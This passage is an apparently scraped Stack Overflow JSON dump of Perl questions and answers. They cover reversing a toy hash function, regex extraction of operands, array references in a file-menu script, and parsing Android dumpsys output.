@letters;\n    while ( $n &gt; 43 ) {\n        unshift @letters, $alphabet[$n % 43];\n        $n /= 43;\n    }\n\n    return join '', @letters;\n}\n\nsay reverse_hash(3552907293224);\n# eddigjo\n</code></pre>\n"}], "owner": {"reputation": 51, "user_id": 5226765, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/869787523113326/picture?type=large", "display_name": "TKrisee", "link": "https://stackoverflow.com/users/5226765/tkrisee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 108, "favorite_count": 2, "closed_date": 1457210863, "accepted_answer_id": 35814823, "answer_count": 1, "score": -2, "last_activity_date": 1497375487, "creation_date": 1457183804, "last_edit_date": 1457190234, "question_id": 35814627, "link": "https://stackoverflow.com/questions/35814627/how-do-i-reverse-this-hashing-function", "closed_reason": "Needs details or clarity", "title": "How do I reverse this hashing function?", "body": "<p>The idea is to get what is the 7 characters long string that produces this number: 3552907293224 with this script:</p>\n\n<pre><code>sub hash {\n     my $nr = 13;\n     for (split //, shift) {\n          $nr = $nr * 43 + index(\"acdegijmnoprstuw\", $_);\n     }\n     return $nr;\n}\n</code></pre>\n\n<p>I managed to figure out the string it's \"eddigjo\" (with manual trying), but I need a function that reverse traces what could possibly genereate the number mentioned above.</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 45, "user_id": 1741028, "user_type": "registered", "accept_rate": 15, "profile_image": "https://www.gravatar.com/avatar/e2b6804f757415727314341336e300c9?s=128&d=identicon&r=PG", "display_name": "tim", "link": "https://stackoverflow.com/users/1741028/tim"}, "edited": false, "score": 0, "creation_date": 1496292460, "post_id": 35810905, "comment_id": 75603000, "body": "Can i know who down vote this question and the reason? Thanks"}], "answers": [{"comments": [{"owner": {"reputation": 45, "user_id": 1741028, "user_type": "registered", "accept_rate": 15, "profile_image": "https://www.gravatar.com/avatar/e2b6804f757415727314341336e300c9?s=128&d=identicon&r=PG", "display_name": "tim", "link": "https://stackoverflow.com/users/1741028/tim"}, "edited": false, "score": 0, "creation_date": 1457191267, "post_id": 35810976, "comment_id": 59299323, "body": "Thank it work! One more question if my  &#39;@arr = ( &quot;a and b&quot;, &quot;a or b&quot;, &quot;a nor b&quot; )&#39;. Can i also done by using one comment?"}], "tags": [], "owner": {"reputation": 30226, "user_id": 2107876, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/975e7190aac72397465126f04f46f3f6?s=128&d=identicon&r=PG", "display_name": "laune", "link": "https://stackoverflow.com/users/2107876/laune"}, "is_accepted": false, "score": 0, "last_activity_date": 1457192816, "last_edit_date": 1457192816, "creation_date": 1457159722, "answer_id": 35810976, "question_id": 35810905, "link": "https://stackoverflow.com/questions/35810905/how-to-extract-string-with-any-operator-between/35810976#35810976", "title": "how to extract string with any operator between?", "body": "<p>A very simple regex might be </p>\n\n<pre><code>/^(\\w+)\\s*(\\W+)\\s*(\\w+)$/\n</code></pre>\n\n<p>Or you enumerate possible operators</p>\n\n<pre><code>   /^(\\w+)\\s*(=|!=|&lt;|&gt;|&lt;=|&gt;=|\\+|-|\\*|\\/|==)\\s*(\\w+)$/\n</code></pre>\n\n<p>It depends whether the input can be trusted or not. If not, you might have to be more meticulous w.r.t. the identifiers, too. Here's a simpler loop, and no need to use m//g(lobal). Not sure about the semicolon - omitted it.</p>\n\n<pre><code>my @arr = ( \"a=b\", \"a&gt;b\", \"a&lt;b\", \"a!=b\", \"a-b\" );\nfor my $str (@arr){\n    if($str =~ /^(\\w+)\\s*(=|!=|&lt;|&gt;|&lt;=|&gt;=|\\+|-|\\*|\\/|==)\\s*(\\w+)$/ ){\n         my $d = $1;\n         my $e = $3;\n         print \"d=$d e=$e\\n\";\n    }\n}\n</code></pre>\n\n<p><strong>Later</strong> If you enumerate the operators, you can also add word symbols:</p>\n\n<pre><code>if($str =~ /^(\\w+)\\s*(=|!=|&lt;|&gt;|&lt;=|&gt;=|\\+|-|\\*|\\/|==|x?or|and)\\s*(\\w+)$/ ){\n    ...\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 10563, "user_id": 1104328, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/df0790774838286ad0d93567ae1fcf56?s=128&d=identicon&r=PG&f=1", "display_name": "Harry", "link": "https://stackoverflow.com/users/1104328/harry"}, "is_accepted": false, "score": 0, "last_activity_date": 1457161212, "last_edit_date": 1457161212, "creation_date": 1457160476, "answer_id": 35811063, "question_id": 35810905, "link": "https://stackoverflow.com/questions/35810905/how-to-extract-string-with-any-operator-between/35811063#35811063", "title": "how to extract string with any operator between?", "body": "<p>You could try something like this one liner</p>\n\n<pre><code>perl -e '@a = (\"a=b\",\"a&gt;b\",\"a&lt;b\",\"a!=b\",\"a-b\"); for $l (@a) { $l =~ s/(.).*(.)/$1/; print \"$1$2\\n\"};'\n</code></pre>\n\n<p>The key thing is the greedy match ie \"(.*)\" between the two single character matches ie \"(.)\". To really make sure that you start at the start and end of the strings you could use this</p>\n\n<pre><code>perl -e '@a = (\"a=b\",\"a&gt;b\",\"a&lt;b\",\"a!=b\",\"a-b\"); for $l (@a) { $l =~ s/^(.).*(.)$/$1/; print \"$1$2\\n\"};'\n</code></pre>\n\n<p>A complete working example that demonstrates the whole thing would be </p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nmy @expressions = (\"a=b\",\"a&gt;b\",\"a&lt;b\",\"a!=b\",\"a-b\"); \nfor my $exp (@expressions) { \n  $exp =~ s/^(.).*(.)$/$1$2/; \n  print \"$1$2 is the same as $exp\\n\";\n};\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 15304, "user_id": 4632019, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8937eb40752cf51c7da61bd4a322a4ef?s=128&d=identicon&r=PG&f=1", "display_name": "Eugen Konkov", "link": "https://stackoverflow.com/users/4632019/eugen-konkov"}, "is_accepted": false, "score": 0, "last_activity_date": 1457277331, "creation_date": 1457277331, "answer_id": 35828589, "question_id": 35810905, "link": "https://stackoverflow.com/questions/35810905/how-to-extract-string-with-any-operator-between/35828589#35828589", "title": "how to extract string with any operator between?", "body": "<p>if there always 'a' and 'b' at the beginning and the end you could try:</p>\n\n<pre><code>my $str =  'a&lt;b';\nmy( $op ) = $str =~ /^a(.*)b$/;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "is_accepted": false, "score": 0, "last_activity_date": 1459093867, "last_edit_date": 1459093867, "creation_date": 1459045670, "answer_id": 36243198, "question_id": 35810905, "link": "https://stackoverflow.com/questions/35810905/how-to-extract-string-with-any-operator-between/36243198#36243198", "title": "how to extract string with any operator between?", "body": "<p>Not a well thought out answer. Will reconsider the problem.</p>\n"}], "owner": {"reputation": 45, "user_id": 1741028, "user_type": "registered", "accept_rate": 15, "profile_image": "https://www.gravatar.com/avatar/e2b6804f757415727314341336e300c9?s=128&d=identicon&r=PG", "display_name": "tim", "link": "https://stackoverflow.com/users/1741028/tim"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 102, "favorite_count": 0, "answer_count": 4, "score": -1, "last_activity_date": 1459093867, "creation_date": 1457159242, "last_edit_date": 1457159485, "question_id": 35810905, "link": "https://stackoverflow.com/questions/35810905/how-to-extract-string-with-any-operator-between", "title": "how to extract string with any operator between?", "body": "<p>I have an array contain <code>@arr = { \"a=b\", \"a&gt;b\", \"a&lt;b\", \"a!=b\", \"a-b\" }</code>. What is the best way to get a and b with any operator between. I can extract by</p>\n\n<pre><code>for($i=0; $i&lt;=$#arr; $i++){\n   $str = $arr[$i];\n   if($str =~ m/^(.*?)(\\s*=\\s*)(.*)(;)/g){\n         my $d = $1;\n         my $e = $3;\n   }\n</code></pre>\n\n<p>Follow by all if statement with the possible operator like <code>\"!=\", \"&lt;\"</code> etc. But this will make my code look messy. Any better solution for this?</p>\n"}, {"tags": ["arrays", "perl"], "answers": [{"tags": [], "owner": {"reputation": 43, "user_id": 5278779, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/5hLJa.jpg?s=128&g=1", "display_name": "Satch", "link": "https://stackoverflow.com/users/5278779/satch"}, "is_accepted": false, "score": 0, "last_activity_date": 1457156034, "creation_date": 1457156034, "answer_id": 35810498, "question_id": 35810011, "link": "https://stackoverflow.com/questions/35810011/perl-how-to-reference-to-an-array/35810498#35810498", "title": "Perl: How to reference to an array?", "body": "<p>First line is $line[0], second is $line[1] and so on...</p>\n\n<p>You can get user choice like this:</p>\n\n<pre><code>   $line[$in]\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 15304, "user_id": 4632019, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8937eb40752cf51c7da61bd4a322a4ef?s=128&d=identicon&r=PG&f=1", "display_name": "Eugen Konkov", "link": "https://stackoverflow.com/users/4632019/eugen-konkov"}, "is_accepted": false, "score": -1, "last_activity_date": 1515268686, "last_edit_date": 1515268686, "creation_date": 1457277972, "answer_id": 35828717, "question_id": 35810011, "link": "https://stackoverflow.com/questions/35810011/perl-how-to-reference-to-an-array/35828717#35828717", "title": "Perl: How to reference to an array?", "body": "<p>About how to refer to perl data structures see <a href=\"https://stackoverflow.com/questions/23649118/perl-return-hash-from-subroutine/35792849#35792849\">here</a></p>\n\n<pre><code>$lines[0]; #First line\n$lines[1]; #Second line\n$array = \\@lines; # Get reference to the list of lines\n$array-&gt;[0]; #First line\n$array-&gt;[1]; #Second line\n</code></pre>\n\n<p>to create file and put data into just use:</p>\n\n<pre><code>open $fh, '&gt;filename';\nprint $fh @lines;\nprint $fh @$array; # ... or same for reference\n</code></pre>\n\n<p>Notice lack of coma after <code>$fh</code></p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user5988819"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 81, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1515268686, "creation_date": 1457152160, "question_id": 35810011, "link": "https://stackoverflow.com/questions/35810011/perl-how-to-reference-to-an-array", "title": "Perl: How to reference to an array?", "body": "<p>I have a program here that will allow user to enter in words that will be used as filenames later on. The user's input is inserted into an array. I then create a simple menu asking what the user wants to do with the \"filename\": create, reame, copy, and delete. Using subroutines, I believe I've successfully executed the code. However, I am having trouble trying to reference the array element. \nIn short, how do I create, rename, copy, and delete the filenames that are saved in the array? The issues I cant resolve are asterisked</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse File::Copy qw/copy/;\n\nmy $new;\nmy $old;\nmy $file;\n\nprint \"Enter number of lines\\n\";\nchomp(my $n = &lt;STDIN&gt;);\n\nmy @lines;\nprint \"Enter some words!\\n\";\nfor (1..$n) {\n\nchomp(my $input = &lt;STDIN&gt;);\n#will add the user input at the beginning of the array\npush @lines, $input;\n}\nprint \"@lines\\n\";\n\n#create a menu\nmy $in = '';\nprint \"1. Create\\n2. Rename\\n3. Copy\\n4. Delete\\n5. Quit\\n\";\nwhile ($in ne \"quit\")\n{\n  print \"\\nEnter the your choice:\\n\";\n    chomp($in = &lt;STDIN&gt;);\n  print \"For which file do you want to $in?\\n\";\n  print \"@lines\\n\";\n  **#I need to reference the array here***********************\n\n  if ($in eq \"create\") {\n***How to create the file that the user inputted?*****************\n    &amp;createFile;\n    print \"\\nFile has been created\\n\";\n  }\n  elsif ($in eq \"rename\") {\n    #print \"Enter the old name\\n\";\n     # chomp($old = &lt;STDIN&gt;);\n#*********refer to array of FILES*********************\n    print \"Enter the new name for this file!\\n\";\n      chomp($new = &lt;STDIN&gt;);\n    &amp;renameFile;\n    print \"File has successfully been renamed.\";\n  }\n  elsif ($in eq \"copy\") {\n#********file and array refering***************************\n    &amp;copyFile;\n    print \"Hopefully, the file has beed copied!\";\n  }\n  elsif ($in eq \"delete\") {\n#******refer to file from user*******************\n    &amp;deleteFile;\n    print \"Deleted\";\n  }\n}\n\n\n\n#create subroutine\nsub createFile {\n  open('&gt;' .*****issue here too**) or die \"\\nCannot create\";\n}\n\nsub renameFile {\n  rename ($old, $new);\n}\n\nsub copyFile {\n  copy $old, $new;\n}\n\nsub deleteFile {\n  #unlink *****************************\n}\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1457133583, "post_id": 35807795, "comment_id": 59284969, "body": "This might be a naive approach, but I&#39;d start by finding which array elements go into your target value evenly. You can use the modulo operator <code>%</code> for that."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1457133627, "post_id": 35807795, "comment_id": 59284989, "body": "That&#39;s a pretty big problem, with a nasty complexity :). Count the appropriate permutations mathematically, by any assumption of how many multiplications you need."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1457133782, "post_id": 35807795, "comment_id": 59285033, "body": "@ThisSuitIsBlackNot Oh, yes, that does help!  May solve it easily."}, {"owner": {"reputation": 509, "user_id": 5020874, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/27f1fe2d2415def240ccc9a16a19548a?s=128&d=identicon&r=PG&f=1", "display_name": "marcuthh", "link": "https://stackoverflow.com/users/5020874/marcuthh"}, "edited": false, "score": 0, "creation_date": 1457134659, "post_id": 35807795, "comment_id": 59285335, "body": "Just to clarify, do you want the function to indicate the values used to do the multiplication, or those values&#39; indices within the array?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1457157700, "post_id": 35807795, "comment_id": 59290120, "body": "Are you really interested in these particular numbers only? Or was this just an example? (Or something else entirely?) Partitioning a number is difficult, but for reasonable, practical cases, it isn&#39;t. Can you clarify this?"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1457183260, "post_id": 35807795, "comment_id": 59296881, "body": "Your edit completely changed the question, which invalidates all the work people did to answer it. Don&#39;t do that. If you realize you asked the wrong question, post a new one. You can link to the original question if you think it&#39;s relevant."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1457204659, "post_id": 35807795, "comment_id": 59304529, "body": "Just for completeness: the question @ThisSuitIsBlackNot refers to is <a href=\"http://stackoverflow.com/q/35814627/5830574\">stackoverflow.com/q/35814627/5830574</a>"}], "answers": [{"comments": [{"owner": {"reputation": 65594, "user_id": 459640, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/bc790307b3c4cdbd25f582d9067651f1?s=128&d=identicon&r=PG", "display_name": "aschepler", "link": "https://stackoverflow.com/users/459640/aschepler"}, "edited": false, "score": 0, "creation_date": 1457135317, "post_id": 35808114, "comment_id": 59285570, "body": "I think you&#39;ll need to multiply more than two numbers in that range to get that product."}], "tags": [], "owner": {"reputation": 509, "user_id": 5020874, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/27f1fe2d2415def240ccc9a16a19548a?s=128&d=identicon&r=PG&f=1", "display_name": "marcuthh", "link": "https://stackoverflow.com/users/5020874/marcuthh"}, "is_accepted": false, "score": -1, "last_activity_date": 1457135140, "creation_date": 1457135140, "answer_id": 35808114, "question_id": 35807795, "link": "https://stackoverflow.com/questions/35807795/how-can-i-reverse-an-algorithm-to-find-which-string-generates-a-specific-output/35808114#35808114", "title": "How can I reverse an algorithm to find which string generates a specific output?", "body": "<p>From what I can understand from your question, you're after something like this...\nMy example is coded in Java, but I'm sure you get the idea!</p>\n\n<pre><code>public String getMultiplicationElements(int[] values, int toGet)\n{\n    //loop for first value in multiplication\n    //will only move to next element when multiplied by all values within array\n    for (int i = 0; i &lt; values.length; i++)\n    {\n        //loop for second value in multiplication\n        for (int j = 0; j &lt; values.length; j++)\n        {\n            //test if matches specified value\n            if ((values[i] * values[j]) == toGet)\n            {\n                //return indication of successful elements\n                return \"Array indices \" + i \" and \" + j\n                        + \" multiply to get this result\";\n            }\n        }\n    }\n    //for if no match found\n    return null;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 1, "last_activity_date": 1457382534, "last_edit_date": 1495540231, "creation_date": 1457135580, "answer_id": 35808184, "question_id": 35807795, "link": "https://stackoverflow.com/questions/35807795/how-can-i-reverse-an-algorithm-to-find-which-string-generates-a-specific-output/35808184#35808184", "title": "How can I reverse an algorithm to find which string generates a specific output?", "body": "<p>Nice go. By <a href=\"https://stackoverflow.com/users/176646/thissuitisblacknot\">ThisSuitIsBlackNot</a> algorithm: None of the numbers in the given range divide the given number evenly so it is not possible to obtain it by multiplying just these.</p>\n\n<pre><code>use warnings;\nuse strict;\n\nmy $num = 3552907293224;\n\nmy @range = (559..574);\n\nmy @divs = grep { $num % $_ == 0 } @range;\n\nif (@divs) {  print \"Divisors: @divs\\n\";    }\nelse       {  print \"No divisors found.\\n\"; }\n\n# Check explicitly (lay our eyes on them)\nfor (@range) { print \"res = \" . ($num / $_) . \"\\n\" }\n</code></pre>\n\n<p>We can make these input so different numbers can be tried but the question was specific to these.  Once the divisors are found, then you need to go through all permutations, of all possible lenghts, checking the multiplication result.  We are talking about factorial complexity.  For small ranges it will work, and there are reductions, but for longer ranges of smaller numbers it will explode quickly.</p>\n\n<p>It is an interesting mathematical and computational problem to run this with good performance.</p>\n\n<hr>\n\n<p><em>The problem got clarified, and it is now a bit different: reverse the process that got to the result.</em>  </p>\n\n<p>The result is the final element in a series that starts at 13 and is generated by the given algorithm. It is driven by an additional input string, with each next character's index providing the offset. We need to reverse the process.</p>\n\n<p>So work backwards.  Take the result and subtract from it the index of the last char of the input string (in the given reference string), then divide by 43.  This is our last factor. Now subtract from it the index of the one-before-last char of the input string and divide by 43, this is our next-to-last factor. Repeat until we hit 13.</p>\n\n<pre><code>$result = 3552907293224;\n$refstr = 'acdegijmnoprstuw';\n$str = 'eddigio';\n\nfor (split '', reverse $str) {\n    $result = $result - index($refstr, $_) ) / 43;\n    print \"$result\\n\";\n}\n</code></pre>\n\n<p>This prints</p>\n\n<pre>\n\n82625751005\n1921529093.02326\n44686723.0005408\n1039226.00001258\n24168.0000002925\n562.000000006802\n13.0000000001582\n\n</pre>\n\n<p>This is the process, confirmed by the fact that we got to 13 in the end.</p>\n\n<hr>\n\n<p><em>The problem evolved further and is now a different <a href=\"https://stackoverflow.com/questions/35814627/how-do-i-reverse-this-hashing-function\">post</a>, with a nice answer.</em></p>\n"}], "owner": {"reputation": 51, "user_id": 5226765, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/869787523113326/picture?type=large", "display_name": "TKrisee", "link": "https://stackoverflow.com/users/5226765/tkrisee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 134, "favorite_count": 1, "answer_count": 2, "score": 1, "last_activity_date": 1457382534, "creation_date": 1457133276, "last_edit_date": 1457184535, "question_id": 35807795, "link": "https://stackoverflow.com/questions/35807795/how-can-i-reverse-an-algorithm-to-find-which-string-generates-a-specific-output", "title": "How can I reverse an algorithm to find which string generates a specific output?", "body": "<p>I want to make a function in Perl that calculates what elements of an array to multiply to get a given value.</p>\n\n<p>The array contains the integers from 559 to 574, inclusive. The value I want to get is 3552907293224.</p>\n\n<p>How can I do this?</p>\n\n<hr>\n\n<p>The idea is to get the 7-character string that produces the number 3552907293224 with this code:</p>\n\n<pre><code>sub hash {\n     my $nr = 13;\n     for (split //, shift) {\n          $nr = $nr * 43 + index(\"acdegijmnoprstuw\", $_);\n     }\n     return $nr;\n}\n</code></pre>\n\n<p>I managed to figure out by trial and error that the string is \"eddigjo\", but I need a function that does this.</p>\n"}, {"tags": ["perl", "awk", "sed", "grep"], "answers": [{"comments": [{"owner": {"reputation": 35, "user_id": 5988446, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0b63a6101a3a0d1d0061e76eee8f8268?s=128&d=identicon&r=PG", "display_name": "user553637", "link": "https://stackoverflow.com/users/5988446/user553637"}, "edited": false, "score": 0, "creation_date": 1457135609, "post_id": 35808174, "comment_id": 59285654, "body": "Yes,exactly what i needed.Thanks!"}, {"owner": {"reputation": 2690, "user_id": 5869736, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b18e361761e0643fd9003f9eae40ba45?s=128&d=identicon&r=PG&f=1", "display_name": "Marty", "link": "https://stackoverflow.com/users/5869736/marty"}, "reply_to_user": {"reputation": 35, "user_id": 5988446, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0b63a6101a3a0d1d0061e76eee8f8268?s=128&d=identicon&r=PG", "display_name": "user553637", "link": "https://stackoverflow.com/users/5988446/user553637"}, "edited": false, "score": 0, "creation_date": 1457135885, "post_id": 35808174, "comment_id": 59285739, "body": "If it&#39;s exactly what you want, please consider up-votting and/or accepting the answer."}, {"owner": {"reputation": 35, "user_id": 5988446, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0b63a6101a3a0d1d0061e76eee8f8268?s=128&d=identicon&r=PG", "display_name": "user553637", "link": "https://stackoverflow.com/users/5988446/user553637"}, "edited": false, "score": 0, "creation_date": 1457136267, "post_id": 35808174, "comment_id": 59285858, "body": "Oops I forgot lol...Perfect answer though.I&#39;m new to Perl,so need a little help over here.Thanks anyway!"}], "tags": [], "owner": {"reputation": 2690, "user_id": 5869736, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b18e361761e0643fd9003f9eae40ba45?s=128&d=identicon&r=PG&f=1", "display_name": "Marty", "link": "https://stackoverflow.com/users/5869736/marty"}, "is_accepted": true, "score": 2, "last_activity_date": 1457135623, "last_edit_date": 1457135623, "creation_date": 1457135534, "answer_id": 35808174, "question_id": 35807527, "link": "https://stackoverflow.com/questions/35807527/need-to-parse-this-dumpsys-output-preferably-with-perl/35808174#35808174", "title": "Need to parse this dumpsys output (preferably with Perl)", "body": "<p>You don't say if you want the heading itself - here I've presumed you do want it.  This is written \"Unix filter\" style, meaning you need to pipe the dump data into it or supply the filename that contains the data as the first parameter to the script. </p>\n\n<pre><code>#!/usr/bin/env perl\nuse v5.12;\n\nmy $target = 'Non-Data \\s+ Actions:';\nmy $taking_data = 0;\n\nwhile (&lt;&gt;) {\n   $taking_data = 1 if (/ ^ \\s* $target \\s* /x) ;\n   print if $taking_data;\n   $taking_data = 0 if / ^ \\s* $ /x ;\n}\n</code></pre>\n\n<p>Ran like so: <code>$ cat dump_data.txt | ./android.pl</code> or <code>$ ./android.pl dump_data.txt</code> produces:</p>\n\n<pre><code>Non-Data Actions:\n    android.intent.action.MAIN:\n    422df0c8.   com.sec.factory.camera/com.sec.android.app.camerafirmware.CameraFirmware filter 422df360\n       Action: \"android.intent.action.MAIN\"\n      Category: \"android.intent.category.DEFAULT\"\n    422df610 com.sec.factory.camera/com.sec.android.app.camerafirmware.CameraFirmware_user filter 422b65f0\n      Action: \"android.intent.action.MAIN\"\n      Category: \"android.intent.category.DEFAULT\"\n    420d08e8 com.sec.factory.camera/com.sec.android.app.camerafirmware.CameraFirmwareUpdate_Booting filter 420d0ac8\n      Action: \"android.intent.action.MAIN\"\n      Category: \"android.intent.category.DEFAULT\"\n  com.sec.android.app.camaftest.SCAN:\n    420a2220 com.sec.factory.camera/com.sec.android.app.camaftest.CaptureActivity filter 4209f468\n      Action: \"com.sec.android.app.camaftest.SCAN\"\n      Category: \"android.intent.category.DEFAULT\"\n\nNon-Data Actions:\n    android.intent.action.BOOT_COMPLETED:\n     420d0c70. com.sec.factory.camera/com.sec.android.app.camerafirmware.CameraFirmwareBroadCastReceiver filter 420d0d18\n       Action: \"android.intent.action.BOOT_COMPLETED\"\n</code></pre>\n\n<p>There's not much to it; set a flag if we find the target on a line by itself optionally surrounded by whitespace; clear the flag if we see a blank line; and in between; print the line if the flag is set.</p>\n\n<p>The <strong>'/x'</strong> on the end of the regex switches on <strong>\"extended mode\"</strong> which allows <strong><em>insignificant</em></strong> whitespace in the regex to make for a clearer layout.</p>\n"}, {"tags": [], "owner": {"reputation": 32690, "user_id": 3266847, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/U0oyt.png?s=128&g=1", "display_name": "Benjamin W.", "link": "https://stackoverflow.com/users/3266847/benjamin-w"}, "is_accepted": false, "score": 0, "last_activity_date": 1457150624, "creation_date": 1457150624, "answer_id": 35809844, "question_id": 35807527, "link": "https://stackoverflow.com/questions/35807527/need-to-parse-this-dumpsys-output-preferably-with-perl/35809844#35809844", "title": "Need to parse this dumpsys output (preferably with Perl)", "body": "<p>Depending on how exactly these logs are formatted, you can select the blocks you want with sed, assuming for example that every block is followed by an empty line:</p>\n\n<pre><code>$ sed -n '/Non-Data Actions:/,/^$/p' dumpsys\n Non-Data Actions:\n    android.intent.action.MAIN:\n    422df0c8.   com.sec.factory.camera/com.sec.android.app.camerafirmware.CameraFirmware filter 422df360\n       Action: \"android.intent.action.MAIN\"\n      Category: \"android.intent.category.DEFAULT\"\n    422df610 com.sec.factory.camera/com.sec.android.app.camerafirmware.CameraFirmware_user filter 422b65f0\n      Action: \"android.intent.action.MAIN\"\n      Category: \"android.intent.category.DEFAULT\"\n    420d08e8 com.sec.factory.camera/com.sec.android.app.camerafirmware.CameraFirmwareUpdate_Booting filter 420d0ac8\n      Action: \"android.intent.action.MAIN\"\n      Category: \"android.intent.category.DEFAULT\"\n  com.sec.android.app.camaftest.SCAN:\n    420a2220 com.sec.factory.camera/com.sec.android.app.camaftest.CaptureActivity filter 4209f468\n      Action: \"com.sec.android.app.camaftest.SCAN\"\n      Category: \"android.intent.category.DEFAULT\"\n\nNon-Data Actions:\n    android.intent.action.BOOT_COMPLETED:\n     420d0c70. com.sec.factory.camera/com.sec.android.app.camerafirmware.CameraFirmwareBroadCastReceiver filter 420d0d18\n       Action: \"android.intent.action.BOOT_COMPLETED\"\n</code></pre>\n"}], "owner": {"reputation": 35, "user_id": 5988446, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0b63a6101a3a0d1d0061e76eee8f8268?s=128&d=identicon&r=PG", "display_name": "user553637", "link": "https://stackoverflow.com/users/5988446/user553637"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 375, "favorite_count": 0, "accepted_answer_id": 35808174, "answer_count": 2, "score": 2, "last_activity_date": 1457150624, "creation_date": 1457131951, "last_edit_date": 1457150041, "question_id": 35807527, "link": "https://stackoverflow.com/questions/35807527/need-to-parse-this-dumpsys-output-preferably-with-perl", "title": "Need to parse this dumpsys output (preferably with Perl)", "body": "<p>I have a problem. I need to parse this dumpsys output given below:</p>\n\n<pre><code> Activity Resolver Table:\n Non-Data Actions:\n    android.intent.action.MAIN:\n    422df0c8.   com.sec.factory.camera/com.sec.android.app.camerafirmware.CameraFirmware filter 422df360\n       Action: \"android.intent.action.MAIN\"\n      Category: \"android.intent.category.DEFAULT\"\n    422df610 com.sec.factory.camera/com.sec.android.app.camerafirmware.CameraFirmware_user filter 422b65f0\n      Action: \"android.intent.action.MAIN\"\n      Category: \"android.intent.category.DEFAULT\"\n    420d08e8 com.sec.factory.camera/com.sec.android.app.camerafirmware.CameraFirmwareUpdate_Booting filter 420d0ac8\n      Action: \"android.intent.action.MAIN\"\n      Category: \"android.intent.category.DEFAULT\"\n  